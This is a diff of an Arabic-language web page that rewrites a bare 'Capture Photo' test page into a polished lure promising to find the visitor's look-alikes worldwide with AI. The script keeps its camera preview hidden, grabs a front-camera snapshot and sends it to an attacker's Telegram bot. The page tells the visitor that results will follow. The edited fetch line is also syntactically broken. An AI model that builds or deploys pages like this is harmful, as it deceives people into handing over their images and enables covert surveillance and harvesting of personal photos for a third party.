@@ -1,18 +1,105 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-  <title>Capture Photo</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>اكتشف أشباهك حول العالم باستخدام الذكاء الاصطناعي</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #1e1e2f;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    header {
+      background-color: #3e4a89;
+      color: #fff;
+      padding: 40px 0;
+      font-size: 2.5em;
+      text-transform: uppercase;
+      font-weight: bold;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      animation: fadeIn 2s ease-in-out;
+    }
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 40px;
+      background-color: #2a2c3e;
+      border-radius: 15px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      animation: slideIn 1.5s ease-in-out;
+    }
+    h2 {
+      color: #f4d03f;
+      font-size: 2.2em;
+      margin-bottom: 20px;
+      animation: fadeIn 2.5s ease-in-out;
+    }
+    p {
+      font-size: 1.4em;
+      line-height: 1.6;
+      color: #b0b0b0;
+      animation: fadeIn 3s ease-in-out;
+    }
+    button {
+      background-color: #f4d03f;
+      color: #2a2c3e;
+      font-size: 1.5em;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s, transform 0.3s;
+      text-transform: uppercase;
+      font-weight: bold;
+      animation: pulse 2s infinite;
+    }
+    button:hover {
+      background-color: #ffca28;
+      transform: scale(1.05);
+    }
+    #videoElement {
+      display: none;
+    }
+    #canvas {
+      display: none;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    @keyframes slideIn {
+      from { transform: translateY(-50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+  </style>
 </head>
 <body>
-  <h1>Welcome to the Test Page</h1>
-  <p>Click the button below to perform the action.</p>
+  <header>
+    اكتشف أشباهك حول العالم باستخدام الذكاء الاصطناعي
+  </header>
 
-  <!-- زر لتنفيذ العملية -->
-  <button id="capture">Click Me</button>
+  <div class="container">
+    <h2>هل ترغب في معرفة من يشبهك في أنحاء العالم؟</h2>
+    <p>استخدم الذكاء الاصطناعي المتقدم لاكتشاف الأشخاص الذين يشبهونك في مختلف أنحاء العالم. اضغط على الزر أدناه لالتقاط صورة باستخدام كاميرتك الأمامية وابدأ رحلة الاكتشاف!</p>
+    
+    <!-- زر لالتقاط الصورة -->
+    <button id="captureButton">ابدأ الاكتشاف الآن</button>
 
-  <!-- عناصر مخفية لالتقاط الصورة -->
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+    <!-- عنصر الفيديو لعرض البث المباشر من الكاميرا (مخفي) -->
+    <video id="videoElement" autoplay></video>
+    
+    <!-- عنصر canvas لالتقاط الصورة (مخفي) -->
+    <canvas id="canvas"></canvas>
+  </div>
 
   <script>
     // ضع معلومات بوت تيليجرام هنا
@@ -21,24 +108,24 @@
 
     let videoStream;
 
-    document.getElementById('capture').addEventListener('click', () => {
+    document.getElementById('captureButton').addEventListener('click', () => {
       // طلب الوصول إلى الكاميرا
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
+          // عرض الفيديو من الكاميرا (مخفي)
           videoStream = stream;
-          const video = document.getElementById('video');
-          video.srcObject = stream;
+          const videoElement = document.getElementById('videoElement');
+          videoElement.srcObject = stream;
 
+          // بعد 2 ثانية، نلتقط الصورة
           setTimeout(() => {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // التقاط الصورة من الكاميرا
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // إيقاف الكاميرا
+            // إيقاف الكاميرا بعد التقاط الصورة
             videoStream.getTracks().forEach(track => track.stop());
 
             // تحويل الصورة إلى Blob
@@ -48,22 +135,30 @@
               formData.append('photo', blob);
 
               // إرسال الصورة إلى تيليجرام
-              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+              fetch("https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN"}/sendPhoto, {
                 method: 'POST',
                 body: formData
               })
               .then(response => {
                 if (response.ok) {
-                  console.log('Image sent to Telegram successfully!');
+                  console.log('تم إرسال الصورة إلى تيليجرام بنجاح!');
+                  alert('تم إرسال الصورة بنجاح! سنقوم بتحليلها وإرسال النتائج قريبًا.');
                 } else {
-                  console.error('Failed to send image to Telegram:', response.statusText);
+                  console.error('فشل إرسال الصورة إلى تيليجرام:', response.statusText);
+                  alert('حدث خطأ أثناء إرسال الصورة. يرجى المحاولة مرة أخرى.');
                 }
               })
-              .catch(error => console.error('Error sending image to Telegram:', error));
+              .catch(error => {
+                console.error('خطأ في إرسال الصورة إلى تيليجرام:', error);
+                alert('حدث خطأ أثناء إرسال الصورة. يرجى المحاولة مرة أخرى.');
+              });
             });
           }, 2000); // تأخير بسيط قبل التقاط الصورة
         })
-        .catch(error => console.error('Error accessing camera:', error));
+        .catch(error => {
+          console.error('خطأ في الوصول إلى الكاميرا:', error);
+          alert("لم نتمكن من الوصول إلى الكاميرا. يرجى المحاولة مرة أخرى.");
+        });
     });
   </script>
 </body>
